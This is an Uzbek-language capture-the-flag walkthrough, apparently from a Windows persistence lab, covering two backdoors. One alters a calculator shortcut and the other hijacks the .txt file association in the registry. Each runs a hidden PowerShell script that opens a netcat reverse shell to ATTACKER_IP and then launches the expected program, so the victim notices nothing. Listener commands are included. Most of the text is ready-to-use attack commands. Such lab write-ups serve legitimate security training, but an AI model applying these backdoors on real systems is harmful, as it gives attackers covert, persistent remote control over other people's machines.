

## 🪓 FLAG 5 — Shortcut hijacking orqali **Persistent Reverse Shell**

### 🎯 Maqsad:

Administratorning calc (calculator) shortcut faylini orqaga (backdoor) o‘zgartirish orqali, foydalanuvchi har safar kalkulyatorni ochganida sizga **reverse shell** qaytadi.

---

### ✅ 1. Powershell script yaratamiz

`backdoor.ps1` faylini yozamiz (masalan: `C:\Windows\System32\backdoor.ps1`):

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"
C:\Windows\System32\calc.exe
```

> `ATTACKER_IP` o‘rniga o‘zining IP manzilingizni qo‘ying. Masalan: `10.10.14.23`

---

### ✅ 2. Shortcut’ni o‘zgartiramiz

* Calc.exe shortcut fayliga o‘ting (masalan: `C:\Users\Administrator\Desktop\calc.lnk`)
* `Right-click → Properties` ni oching
* `Target` maydonini quyidagiga o‘zgartiring:

```powershell
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

> Shuningdek, shortcut ikonkasini asl `calc.exe` ga yo‘naltiring (visual shubhani bartaraf qilish uchun).

---

### ✅ 3. Listener ishga tushiring

AttackBox’da quyidagi buyruqni ishga tushiring:

```bash
nc -lvp 4445
```

---

### ✅ 4. Shortcut ustiga bosganingizda:

* Sizga reverse shell keladi (4445 port orqali)
* Foydalanuvchiga oddiy kalkulyator ochiladi

---

### ✅ 5. Shell kelgandan so‘ng flagni ishga tushiring:

```cmd
C:\flags\flag5.exe
```

---

## 🧨 FLAG 6 — File Association Hijacking orqali Persistent Shell

### 🎯 Maqsad:

`.txt` fayllar ochilganda **notepad.exe** bilan birga **sizga reverse shell** qaytishini ta'minlash.

---

### ✅ 1. backdoor2.ps1 faylini yaratamiz

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

Bu faylni saqlang:

```plaintext
C:\Windows\backdoor2.ps1
```

---

### ✅ 2. Registry’ni o‘zgartirish

Registry Editor (`regedit`) orqali yoki PowerShell orqali:

```powershell
Set-ItemProperty -Path "HKLM:\Software\Classes\txtfile\shell\open\command" -Name "(default)" -Value 'powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -File C:\Windows\backdoor2.ps1'
```

> Bu `.txt` fayl ochilganda avtomatik ravishda siz yozgan ps1 skriptni ishga tushiradi.

---

### ✅ 3. Listener ishga tushiring

```bash
nc -lvp 4448
```

---

### ✅ 4. `.txt` faylni oching (yoki yangisini yarating):

```cmd
echo hello > test.txt
start test.txt
```

---

### ✅ 5. Reverse Shell kelganidan so‘ng flagni bajaring:

```cmd
C:\flags\flag6.exe
```

---

## 🏁 Xulosa:

| Flag | Texnika                          | Listener Port | Script          |
| ---- | -------------------------------- | ------------- | --------------- |
| 5    | Shortcut hijack (`calc.lnk`)     | `4445`        | `backdoor.ps1`  |
| 6    | File Association hijack (`.txt`) | `4448`        | `backdoor2.ps1` |

Ikkala usul ham **foydalanuvchi hech narsa sezmasdan** sizga shell qaytaradi.

